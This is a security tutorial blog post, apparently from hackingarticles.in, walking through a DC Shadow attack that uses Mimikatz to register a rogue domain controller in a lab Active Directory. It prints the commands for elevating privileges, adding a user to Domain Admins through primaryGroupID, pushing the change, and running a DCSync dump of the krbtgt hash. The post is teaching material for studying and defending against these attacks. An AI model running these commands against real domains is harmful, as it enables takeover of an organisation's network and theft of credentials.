@@ -1,0 +1,51 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Domain Persistence: DC Shadow Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-persistence-dc-shadow-attack/" rel="bookmark"><time class="entry-date published" datetime="2020-06-08T09:51:08+00:00">June 8, 2020</time><time class="updated" datetime="2025-05-11T20:40:16+00:00">May 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this post, we are going to discuss the most dynamic attack on AD, named as DC Shadow attack for Domain Persistence. It is part of Persistence, which creates a rogue Domain controller in the network. This attack is an actual threat because of This attack leverages another dynamic attack, such as  DCSync Attack and Golden Ticket Attack.</span></p>
+<h3><span style="color: #800000;">DCShadow Attack</span></h3>
+<p><span style="color: #000000;">Dcshadow is a feature in Mimikatz that manipulates Active Directory (AD) data. Including objects and schemas, by registering and replicating the behaviour of a Domain Controller (DC). It simulates the behaviour of a Domain Controller (using protocols like RPC used only by DC) to inject its data, bypassing most of the common security controls and including your SIEM. DCShadow Attack shares some similarities with the DCSync attack (already present in the lsadump module of mimikatz)</span></p>
+<p><span style="color: #000000;">It is a post-exploitation attack (also called a domination attack) because it requires domain admin (or enterprise admin) privileges</span></p>
+<h4><span style="color: #000000;">Description of the attack</span></h4>
+<p><span style="color: #000000;">The attacks are done using the following steps:</span></p>
+<ul>
+<li><span style="color: #000000;">registering the “DC” by creating 2 objects in the CN=Configuration partition and altering the SPN of the computer used.</span></li>
+<li><span style="color: #000000;">Pushing the data (triggered using DrsReplicaAdd, KCC or other internal AD events)</span></li>
+<li><span style="color: #000000;">Removing the object previously created to demote the DC</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h5><strong><span style="color: #000000;">Identifying the Compromised User</span></strong></h5>
+<p><span style="color: #000000;">Using the compromised user account, we identify the identity of the logon user “Yashika” and notice that it is a member of the Domain User group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user yashika /Domain</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-bFLp97jKrV4/Xt4IeI-GG2I/AAAAAAAAke0/C98WPE3URdMY-5p3hOao7TvMJSCi_me9wCLcBGAsYHQ/s1600/0.png" alt="DC Shadow Attack for Domain Persistence" width="629" height="526"/></span></p>
+<h5><strong><span style="color: #000000;">Setting Up Mimikatz for the DC Shadow Attack</span></strong></h5>
+<p><span style="color: #000000;">To perform the DC SHADOW attack. You need to download and install Mimikatz on the host machine. Run it as an administrator in order to execute “<strong>!+</strong>” and “<strong>!processtoken</strong>” commands. This will register and start mimidrv service and try to elevate for privilege token, thus it provides privilege to call kernel-level functions via a user-mode application.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">!+
+!processtoken
+token::whoami</pre>
+<p><span style="color: #000000;">Thus with the help of “<strong>token::whoami</strong>” we can enumerate the current identity. As you can observe that it has shown “NT Authority/System” privilege.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-6DQMBWSE99Y/Xt4IeKIS24I/AAAAAAAAkew/l4InUJqKdmAXZRopY_nL5tl8KL774dNXwCLcBGAsYHQ/s1600/100.png" alt="DC Shadow Attack for Domain Persistence" width="657" height="309"/></span></p>
+<h5><strong><span style="color: #000000;">Executing the DC Shadow Attack</span></strong></h5>
+<p><span style="color: #000000;">Now execute the following command, which will mimic a bogus domain controller in the network and try to add user Yashika to the domain admin group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::dcshadow /object:yashika /attribute:primaryGroupID /value:512</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LcQbd47c4Oc/Xt4IeU0O-EI/AAAAAAAAke4/DIOi3UknHTUKl_VYV_Jf3bsaPBaboUpGQCLcBGAsYHQ/s1600/101.png"/></span></p>
+<p><span style="color: #000000;">Open one more mimikatz in a new terminal and execute the following command. This will try to push a bogus domain controller into a legitimate.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::dcshadow /push</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-nnMANlZlDe0/Xt4IfK85WAI/AAAAAAAAke8/uXnJ2LOnJiMWvMdtNlS6rPMgk2tVwsQCQCLcBGAsYHQ/s1600/102.png" alt="DC Shadow Attack for Domain Persistence" width="647" height="570"/></span></p>
+<p><span style="color: #000000;">So, after executing the above-mentioned command. We checked the identity for user Yashika again and noticed that this time, it became a member of the domain admin group.</span></p>
+<h5><strong><span style="color: #000000;">Why DC Shadow is a Powerful Attack</span></strong></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user yashika /Domain</pre>
+<p><span style="color: #000000;">DC Shadow is considered a dynamic attack. If you add a user into the PrimaryGroupID object, it is not easy for an administrator to remove that user from the domain admin group.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lu5aYzIrcxc/Xt4IfeD-Z3I/AAAAAAAAkfA/2jax7NjOGfozepTD2ulSCvLKCipcHEXVQCLcBGAsYHQ/s1600/103.png"/></span></p>
+<p><span style="color: #000000;">This attack also becomes a ladder for carrying out other attacks, like the DCsync attack. As we discussed earlier, if a host is a member of a privileged group. Such as a domain administrator or enterprise, an intruder can imitate a domain controller with dcsync attacks. He can request user NTLM hashes from other domain controllers on the network. Read more about it <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-dcsync-attack/">here</a></strong></span>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::dcsync /domain:ignite.local /user:krbtgt</pre>
+<p><span style="color: #000000;">Once the intruder is able to get hashes of the KDC server, further, he can carry out the Golden Ticket attack, which reads from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong></span>, therefore, we call DC Shadow the most dynamic attack on AD.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-iSW7qyma8xU/Xt4IfbLE7gI/AAAAAAAAkfE/YAlOsc51kG40SF0nDn4SGKlZa5rKavI0QCLcBGAsYHQ/s1600/104.png" alt="DC Shadow Attack for Domain Persistence" width="611" height="676"/></span></p>
+<p><span style="color: #000000;"><strong>Reference</strong>: <strong><a href="https://www.dcshadow.com/">https://www.dcshadow.com/</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
